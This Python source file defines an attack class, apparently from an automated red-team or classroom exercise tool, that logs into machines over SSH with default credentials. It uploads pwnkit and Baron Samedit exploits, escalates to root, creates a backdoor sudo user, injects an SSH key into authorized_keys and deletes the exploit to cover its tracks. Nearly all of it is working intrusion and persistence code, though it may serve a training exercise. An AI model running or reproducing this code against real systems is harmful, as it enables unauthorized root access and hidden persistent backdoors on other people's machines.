import paramiko
import yaml
from Exploit import Exploit, PatchedException
import BetterLogger
from BetterLogger import logger

class ExploitDefaultCredentials(Exploit):
	def __init__(self, ip_address, parsed_config) -> None:
		super().__init__(ip_address=ip_address, parsed_config=parsed_config)

	def connect_over_ssh(self, username, password) -> paramiko.SSHClient:
		logger.info(f"{self.ip_address} - Logging in as `{username}` over SSH...")
		ssh_client = paramiko.SSHClient()
		ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh_client.connect(self.ip_address, username=username, password=password, timeout=3)
		logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - Successfully logged in as `{username}`.{BetterLogger.COLOR_END}")
		return ssh_client

	def exploit_pwnkit(self, ssh_client, username):
		"""
		Exploits pwnkit over an existing SSH connection
		"""
		try:
			logger.info("Attempting to exploit the pwnkit vulnerability...")
			logger.info("Copying pwnkit_x64 binary over SSH...")
			sftp = ssh_client.open_sftp()
			pwnkit_binary_name = "pwnkit_x64"
			pwnkit_destination_path = f"/home/{username}/{pwnkit_binary_name}"
			sftp.put(localpath=f"./exploits/{pwnkit_binary_name}", remotepath=pwnkit_destination_path, confirm=True)
			logger.info(f"Successfully copied {pwnkit_binary_name} binary over SSH.")
			sftp.close()

			logger.info("Setting the pwnkit binary to be executable...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"chmod +x ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully set the pwnkit binary to be executable.")

			logger.info("Checking for root privileges...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'whoami' | ./{pwnkit_binary_name}")
			output_as_string = ssh_stdout.read().decode().strip()
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.debug(f"'whoami' output: {output_as_string}")

			logger.info("Creating sudo user to log in as...")
			useradd_command = "useradd -m josh -g sudo -s /bin/bash"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{useradd_command}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully created user to log in as.")

			logger.info("Adding SSH key to elliot's authorized keys...")
			add_ssh_key_command = f"grep -qxF \"{self.public_ssh_key_to_inject}\" /home/elliot/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/elliot/.ssh/authorized_keys"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully added SSH key to elliot's authorized keys.")

			logger.info("Adding SSH key to josh's authorized keys...")
			# the following line is a little complex, first we create the .ssh directory if it doesn't exist, then check if our public SSH key is in the authorized keys, then we add it to the authorized keys if it is not already there
			add_ssh_key_command = f"mkdir -p /home/josh/.ssh && grep -qxF \"{self.public_ssh_key_to_inject}\" /home/josh/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/josh/.ssh/authorized_keys"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully added SSH key to josh's authorized keys.")

			logger.info("Cleaning up pwnkit binary...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'rm {pwnkit_destination_path}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully cleaned up the pwnkit binary.")

			ssh_client.close()

			if output_as_string == "root":
				logger.info(f"{BetterLogger.COLOR_GREEN}Successfully got root via the user `{username}` using pwnkit.{BetterLogger.COLOR_END}")
				return True
			else:
				logger.info(f"{BetterLogger.COLOR_RED}Failed to get root, the system does not seem to be vulnerable to pwnkit.{BetterLogger.COLOR_END}")
				return False
		except Exception as err:
			logger.exception(err)
			return False

	def exploit_baron_samedit(self, ssh_client, username):
		"""
		Exploits baron samedit over an existing SSH connection
		"""
		try:
			logger.info("Attempting to exploit the Baron Samedit vulnerability...")
			logger.info("Copying baron_samedit.py over SSH...")
			sftp = ssh_client.open_sftp()
			baron_samedit_script = "baron_samedit.py"
			baron_samedit_script_destination_path = f"/home/{username}/{baron_samedit_script}"
			sftp.put(localpath=f"./exploits/{baron_samedit_script}", remotepath=baron_samedit_script_destination_path, confirm=True)
			logger.info(f"Successfully copied {baron_samedit_script} over SSH.")
			sftp.close()

			logger.info("Checking for root privileges...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'whoami' | python3 {baron_samedit_script}")
			output_as_string = ssh_stdout.read().decode().strip()
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.debug(f"'whoami' output: {output_as_string}")

			logger.info("Creating sudo user to log in as...")
			useradd_command = "useradd -m josh -g sudo -s /bin/bash"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{useradd_command}' | python3 {baron_samedit_script}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully created user to log in as.")

			logger.info("Adding SSH key to elliot's authorized keys...")
			add_ssh_key_command = f"grep -qxF \"{self.public_ssh_key_to_inject}\" /home/elliot/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/elliot/.ssh/authorized_keys"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | python3 {baron_samedit_script}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully added SSH key to elliot's authorized keys.")

			logger.info("Adding SSH key to josh's authorized keys...")
			# the following line is a little complex, first we create the .ssh directory if it doesn't exist, then check if our public SSH key is in the authorized keys, then we add it to the authorized keys if it is not already there
			add_ssh_key_command = f"mkdir -p /home/josh/.ssh && grep -qxF \"{self.public_ssh_key_to_inject}\" /home/josh/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/josh/.ssh/authorized_keys"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | python3 {baron_samedit_script}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully added SSH key to josh's authorized keys.")

			logger.info("Cleaning up baron_samedit script...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'rm {baron_samedit_script_destination_path}' | python3 {baron_samedit_script}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully cleaned up the baron_samedit script.")

			ssh_client.close()

			if output_as_string == "root":
				logger.info(f"{BetterLogger.COLOR_GREEN}Successfully got root via the user `{username}` using Baron Samedit.{BetterLogger.COLOR_END}")
				return True
			else:
				logger.info(f"{BetterLogger.COLOR_RED}Failed to get root, the system does not seem to be vulnerable to Baron Samedit.{BetterLogger.COLOR_END}")
				return False
		except Exception as err:
			logger.exception(err)
			return False

	def check_login(self, username, password, is_sudo_user, exploit_pwnkit=True, exploit_baron_samedit=True):
		"""
		Returns True if we successfully got root, and returns False otherwise
		"""
		try:
			got_root = False
			logger.info(f"Logging in as `{username}` over SSH...")
			ssh_client = paramiko.SSHClient()
			ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh_client.connect(self.ip_address, username=username, password=password, timeout=5)
			logger.info(f"{BetterLogger.COLOR_ORANGE}Successfully logged in as `{username}`.{BetterLogger.COLOR_END}")
		except paramiko.AuthenticationException as err:
			logger.info(f"{BetterLogger.COLOR_RED}Failed to log in as `{username}`. The user most likely changed their password!{BetterLogger.COLOR_END}")
			return False
		except Exception as err:
			logger.info(f"{BetterLogger.COLOR_RED}Failed to log in as `{username}`{BetterLogger.COLOR_END}")
			return False

		if is_sudo_user:
			ssh_client.close()
			logger.info(f"{BetterLogger.COLOR_GREEN}This user has sudo access so we don't even need to try exploits!{BetterLogger.COLOR_END}")
			return True

		logger.info(f"Attempting to get root using unpatched privilege escalation CVEs...")
		if not got_root and exploit_pwnkit: # only attempt to exploit pwnkit if we're not already a sudo user
			got_root = self.exploit_pwnkit(ssh_client=ssh_client, username=username)
		if not got_root and exploit_baron_samedit:
			got_root = self.exploit_baron_samedit(ssh_client=ssh_client, username=username)

		ssh_client.close()
		if not got_root:
			logger.info(f"{BetterLogger.COLOR_RED}Failed to get root using unpatched privilege escalation CVEs.{BetterLogger.COLOR_END}")
		return got_root

	def check_all_logins(self):
		"""
		Tries to connect using all default credentials
		"""
		logger.info("Attempting to get root by checking each login and exploiting local CVEs if necessary...")
		parsed_config = self.read_config_file()
		credentials = parsed_config["credentials"]
		got_root = False
		for credential in credentials:
			got_root_with_credentials = self.check_login(username=credential["username"], password=credential["password"], is_sudo_user=credential["sudo_user"])
			if got_root_with_credentials:
				got_root = True
				break
		return got_root

	def test_if_vulnerable(self):
		"""
		Returns True if any default credentials can be used to connect and returns False otherwise
		"""
		try:
			logger.info(f"{self.ip_address} - Checking if default credentials are being used...")
			credentials = self.parsed_config["credentials"]
			successfully_connected_users = []
			for credential in credentials:
				username = credential["username"]
				password = credential["password"]
				try:
					ssh_client = self.connect_over_ssh(username=username, password=password)
					ssh_client.close()
					successfully_connected_users.append(username)
				except paramiko.AuthenticationException:
					logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - Failed to log in as `{username}` because the student changed their password!{BetterLogger.COLOR_END}")
					continue
				except Exception:
					logger.critical(f"{BetterLogger.COLOR_RED}{self.ip_address} - Failed to connect to the machine over SSH, something unexpected happened!{BetterLogger.COLOR_END}")
					continue

			if len(successfully_connected_users) == 0:
				logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - Failed to log in as any of the users. The student changed all of their passwords!{BetterLogger.COLOR_END}")
				return False
			logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - Successfully connected with the following users: {successfully_connected_users}{BetterLogger.COLOR_END}")
			return True
		except paramiko.ssh_exception.NoValidConnectionsError:
			logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Failed to connect to the machine over SSH, the student disabled SSH!{BetterLogger.COLOR_END}")

	def run_custom_command(self, command):
		raise NotImplementedError
